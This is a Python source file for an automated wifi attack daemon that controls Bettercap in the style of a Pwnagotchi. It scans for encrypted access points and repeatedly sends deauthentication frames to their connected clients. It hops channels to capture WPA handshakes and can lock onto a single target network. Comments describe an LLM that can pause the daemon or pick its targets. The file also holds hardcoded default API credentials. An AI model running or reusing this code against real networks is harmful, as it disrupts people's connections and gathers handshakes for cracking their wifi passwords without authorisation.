import time
import logging
import random
import requests
import os
from requests.auth import HTTPBasicAuth
from threading import Thread

# Try to use openclawgotchi config if available, otherwise fallback to defaults
try:
    from config import PWN_WHITELIST_MACS, BETTERCAP_URL, BETTERCAP_USER, BETTERCAP_PASS
except ImportError:
    PWN_WHITELIST_MACS = []
    BETTERCAP_URL = "http://localhost:8081/api"
    BETTERCAP_USER = "gotchi"
    BETTERCAP_PASS = "123456"

log = logging.getLogger("PwnSubconscious")
logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")


class PwnDaemon:
    """
    The Subconscious Pwn Daemon.
    Runs a lightweight Automata state machine that completely mirrors the core hacking 
    logic of a modern Pwnagotchi.
    """
    def __init__(self):
        self.auth = HTTPBasicAuth(BETTERCAP_USER, BETTERCAP_PASS)
        self.running = False
        self.history = {}  # Tracks how many times we've interacted with a MAC
        self.current_channel = 0
        self.channels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]  # Standard 2.4GHz
        self.max_interactions = 3 # Max deauths per target to avoid spamming

    def _request(self, method, endpoint, payload=None):
        """Wrapper for Bettercap REST API calls"""
        url = f"{BETTERCAP_URL}/{endpoint}"
        try:
            if method == "GET":
                r = requests.get(url, auth=self.auth, timeout=5)
            elif method == "POST":
                r = requests.post(url, auth=self.auth, json=payload, timeout=5)
            r.raise_for_status()
            return r.json()
        except Exception as e:
            log.debug(f"Bettercap API Error: {e}")
            return None

    def run_cmd(self, cmd):
        """Execute a command in Bettercap"""
        log.debug(f"Bettercap CMD: {cmd}")
        return self._request("POST", "session", {"cmd": cmd})

    def get_session(self):
        """Get the current wifi session state"""
        return self._request("GET", "session")

    def _should_interact(self, mac):
        """Check if we should deauth this target (not whitelisted, not over-spammed)"""
        if mac.lower() in [w.lower() for w in PWN_WHITELIST_MACS]:
            return False
            
        if mac not in self.history:
            self.history[mac] = 1
            return True
            
        self.history[mac] += 1
        return self.history[mac] <= self.max_interactions

    def attack_loop(self):
        log.info("Subconscious Pwn Daemon Started. Initializing wlan0mon recon...")
        
        # Turn on wifi.recon and ble.recon
        self.run_cmd('wifi.recon on')
        self.run_cmd('wifi.clear')
        self.run_cmd('ble.recon on')
        self.run_cmd('ble.clear')
        
        self.running = True
        
        while self.running:
            try:
                # -- Daemon Control Checks (Atomic IPC Bridge) --
                from utils.ipc import state_manager
                state = state_manager.get_state()
                
                # Check for pause
                if time.time() < state.get("paused_until", 0):
                    remaining = int(state["paused_until"] - time.time())
                    log.info(f"Daemon is paused by LLM. Waking up in {remaining} seconds...")
                    time.sleep(5)
                    continue
                            
                target_bssid = state.get("target_lock")
                if target_bssid:
                    log.info(f"Target Lock Active: Daemon is focused exclusively on {target_bssid}")
                        
                # Dynamic Whitelist Reload
                global PWN_WHITELIST_MACS
                if os.path.exists(".env"):
                    with open(".env", "r") as f:
                        for line in f:
                            if line.startswith("PWN_WHITELIST_MACS="):
                                PWN_WHITELIST_MACS = line.split("=", 1)[1].strip().split(",")

                # 1. Fetch current environment state
                session = self.get_session()
                if not session or 'wifi' not in session or 'aps' not in session['wifi']:
                    log.warning("Bettercap not returning wifi data. Retrying in 5s...")
                    time.sleep(5)
                    continue
                
                aps = session['wifi']['aps']
                deauthed = False

                # 2. Iterate through visible access points
                for ap in aps:
                    # Skip open networks
                    if ap['encryption'] == '' or ap['encryption'] == 'OPEN':
                        continue
                        
                    # Target Lock Constraints
                    if target_bssid and target_bssid != ap['mac'].lower():
                        continue
                    
                    # 3. Find active clients (stations) on this AP
                    clients = ap.get('clients', [])
                    for client in clients:
                        client_mac = client['mac']
                        
                        # 4. Determine if we should attack
                        if self._should_interact(client_mac):
                            ap_name = ap.get('hostname', ap['mac'])
                            log.info(f"Target found: Deauthing {client_mac} from AP {ap_name} (CH: {ap['channel']})")
                            
                            # Execute Deauth
                            self.run_cmd(f"wifi.deauth {client_mac}")
                            deauthed = True
                            
                            # Wait slightly to let frames fly
                            time.sleep(1)

                # 5. Channel Hopping Logic
                if target_bssid:
                    target_ch = next((ap['channel'] for ap in aps if ap['mac'].lower() == target_bssid), None)
                    if target_ch:
                        if self.current_channel != target_ch:
                            self.run_cmd(f"wifi.recon.channel {target_ch}")
                            self.current_channel = target_ch
                            log.info(f"Target Locked: Hopped to CH {target_ch} exclusively for {target_bssid}")
                        time.sleep(2)
                        continue

                # If we didn't do anything exciting, hop channel quickly. 
                # If we deauthed, stay a bit longer to catch the handshake.
                wait_time = 5 if deauthed else 2
                time.sleep(wait_time)

                # Hop to next random channel
                next_channel = random.choice(self.channels)
                self.run_cmd(f"wifi.recon.channel {next_channel}")
                self.current_channel = next_channel
                log.info(f"Hopped to channel {next_channel}. Currently tracking {len(aps)} APs.")

            except Exception as e:
                log.error(f"Error in attack loop: {e}")
                time.sleep(5)

    def start_background(self):
        """Starts the daemon in a background thread"""
        t = Thread(target=self.attack_loop, daemon=True, name="SubconsciousPwn")
        t.start()
        return t

if __name__ == "__main__":
    # Standalone test mode
    daemon = PwnDaemon()
    daemon.attack_loop()
